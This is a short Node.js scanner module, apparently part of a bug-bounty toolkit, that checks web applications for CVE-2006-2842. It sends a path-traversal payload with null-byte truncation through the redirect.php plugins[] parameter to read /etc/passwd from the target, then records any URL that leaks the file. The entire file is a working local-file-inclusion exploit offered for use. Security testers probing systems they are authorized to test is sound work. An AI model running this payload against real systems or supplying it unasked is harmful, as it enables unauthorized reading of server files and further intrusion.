#!/usr/bin/env node
/**
 * CVE-2006-2842
 * CVE-2006-2842 is a powerful scanner for bug bounty hunters and penetration testers to discover vulnerabilities in their web applications.
 *
 * @author karthikeyan V (karthithehacker) <https://karthithehacker.com>
 */
//lib and includes section 

 
var fs = require('fs');
const axios = require('axios');

// Function to scan a URL for CVE-2006-2842 vulnerability
class scan {
    constructor(urli,savepath) {
        async function scanUrlForCVE(url) {
            const payload = '=../../../../etc/passwd%00';
            const fullUrl = `${url}/src/redirect.php?plugins[]${payload}`;
            const response = await axios.get(fullUrl, { validateStatus: null });
            if (response.data.includes('root:') || response.data.includes('www-data:')) {
                console.log(`\n\x1b[31;1m[CVE-2006-2842] \x1b[32;1mLFI found \x1b[37;1m===> \x1b[33;3m${fullUrl}\n`);
                if(savepath == null || savepath == true){
                        return;     
                        }
                else{
                    fs.appendFileSync(savepath, fullUrl+"\n", function (err) {
                    if (err) throw err;
                        });
                                
                    }  
            }
            
        }
        scanUrlForCVE(urli);
    }
}
module.exports = {
    scanner: scan
}